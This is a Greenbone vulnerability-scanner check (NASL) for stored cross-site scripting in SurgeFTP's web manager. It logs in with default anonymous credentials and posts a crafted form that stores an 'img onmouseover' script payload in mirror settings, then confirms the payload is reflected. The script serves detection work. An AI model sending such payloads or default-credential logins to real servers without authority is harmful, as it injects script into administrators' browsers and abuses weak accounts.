# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806805");
  script_version("2023-08-03T05:05:16+0000");
  script_tag(name:"last_modification", value:"2023-08-03 05:05:16 +0000 (Thu, 03 Aug 2023)");
  script_tag(name:"creation_date", value:"2015-12-18 09:54:55 +0530 (Fri, 18 Dec 2015)");
  script_tag(name:"cvss_base", value:"3.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("SurgeFTP Multiple XSS Vulnerabilities (Nov 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/www", 7021);
  script_mandatory_keys("surgeftp/banner");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  script_tag(name:"summary", value:"SurgeFTP Server is prone to multiple stored cross-site
  scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to insufficient validation of user
  supplied input while adding new 'mirrors' and new 'domains'");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to create a
  specially crafted request that would execute arbitrary script code in a user's browser session
  within the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"SurgeFTP version 23d6 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38762/");

  exit(0);
}

if (get_kb_item("default_credentials/disable_default_account_checks"))
  exit(0);

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 7021);

banner = http_get_remote_headers(port: port);

if ('Basic realm="surgeftp' >!< banner)
  exit(0);

auth = base64(str: "anonymous:anonymous");

url = "/cgi/surgeftpmgr.cgi";

headers = make_array("Content-Type", "application/x-www-form-urlencoded",
                     "Authorization", "Basic " + auth);

data = "mirrorid=-1&mirror_ssl=TRUE&lcl=%3Cimg+src%3Dx+onmouseover%3D" +
       "alert%28%22XSS-TEST1%22%29%3E&remote_host=%3Cimg+src%3Dx+onmouseover%3Dalert%28%22XSS" +
       "-TEST1%22%29%3E&remote_path=%2Fpub%2Fxxxx&use_full_path_local=TRUE&files=*.zip" +
       "%2C*.tar.Z&xdelay=1440&user=anonymous&pass=secpod%40secpod123&cmd_mirror_save." +
       "x=23&cmd_mirror_save.y=16";

req1 = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res1 = http_keepalive_send_recv(port: port, data: req1);

if (res1 =~ "^HTTP/1\.[01] 200" && ">Mirror settings <" >< res1) {
  url2 = "/cgi/surgeftpmgr.cgi?cmd=mirrors";
  headers = make_array("Authorization", "Basic " + auth);

  req2 = http_get_req(port: port, url: url2, add_headers: headers);
  res2 = http_keepalive_send_recv(port: port, data: req2);

  if (res2 =~ "^HTTP/1\.[01] 200" &&
    '><img src=x onmouseover=alert("XSS-TEST1")' >< res2 && ">Mirrors<" >< res2) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
